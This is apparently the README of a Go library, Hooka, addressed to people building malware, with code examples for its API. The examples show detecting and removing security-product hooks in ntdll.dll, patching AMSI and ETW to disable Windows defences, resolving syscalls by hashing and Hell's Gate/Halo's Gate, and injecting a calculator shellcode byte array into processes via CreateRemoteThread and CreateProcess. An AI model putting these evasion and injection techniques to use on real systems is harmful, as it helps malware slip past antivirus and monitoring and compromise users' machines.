# Library

If you're looking to implement any function in your malware you can do it using the official package API. First of all download the package

```sh
go get github.com/D3Ext/Hooka/pkg/hooka
```

Here you have some real examples

> Detect hooked functions (including false positives)
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Returns all hooked functions
  hooks, err := hooka.DetectHooks() // func DetectHooks() ([]string, error)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(hooks)

  // Check if an especific function is hooked
  check, err := hooka.IsHooked("NtCreateThread") // func IsHooked(funcname string) (bool, error)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(check) // true or false
}
```

> Resolve syscalls via API hashing
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){

  // 8c2beefa1c516d318252c9b1b45253e0549bb1c4 = NtCreateThread
  // it comes from: hooka.HashFromFunc("NtCreateThread")

  // Returns a pointer to function like NewProc()
  proc, err := hooka.FuncFromHash("8c2beefa1c516d318252c9b1b45253e0549bb1c4")
  if err != nil {
    log.Fatal(err)
  }

  // Now use the procedure as loading it from dll
  r, err := hooka.Syscall(
    proc,
    arg1,
    arg2,
    arg3,
    arg4,
  )

  ...
}
```

> Apply AMSI and ETW patch
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Amsi bypass
  err := hooka.PatchAmsi()
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("AMSI bypassed!")

  // ETW bypass
  err = hooka.PatchEtw()
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("ETW bypassed!")
}
```

> Get syscall id with Hell's Gate + Halo's Gate
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Get syscall id of function, only ntdll.dll is supported
  sysId, err := hooka.GetSysId("NtCreateThread") // func GetSysId(funcname string) (uint16, error)
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("Syscall ID:", sysId)
  r, err := hooka.Syscall( // Execute syscall
    sysId,  // especify func
    arg1,   // pass neccesary arguments
    arg2,
    arg3,
    arg4,
  )

  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("Error code:", r)
}
```

> Use shellcode injection techniques
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

var calc_shellcode = []byte{0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59, 0x48, 0x83, 0xec, 0x28, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x3, 0x57, 0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x1, 0xfe, 0x8b, 0x54, 0x1f, 0x24, 0xf, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x2, 0xad, 0x81, 0x3c, 0x7, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x1, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x1, 0xf7, 0x99, 0xff, 0xd7, 0x48, 0x83, 0xc4, 0x30, 0x5d, 0x5f, 0x5e, 0x5b, 0x5a, 0x59, 0x58, 0xc3}

func main(){
  err := hooka.CreateRemoteThread(calc_shellcode)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("Shellcode injected via CreateRemoteThread")

  err = hooka.CreateProcess(calc_shellcode)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("Shellcode injected via CreateProcess")

  ...
}
```

> Unhook a function (3 ways)
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Use classic technique
  err := hooka.ClassicUnhook("NtCreateThread", "C:\\Windows\\System32\\ntdll.dll")
  if err != nil {
    log.Fatal(err)
  }

  // This technique loads original ntdll.dll from disk into memory to restore all functions
  err = hooka.FullUnhook("C:\\Windows\\System32\\ntdll.dll")
  if err != nil {
    log.Fatal(err)
  }

  // Use modern Perun's Fart technique
  err = hooka.PerunsUnhook()
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("[+] Functions should have been unhooked!")
}
```

> Get function pointer
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  ptr, err := hooka.GetFuncPtr("NtCreateThread")
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println(ptr)
}
```


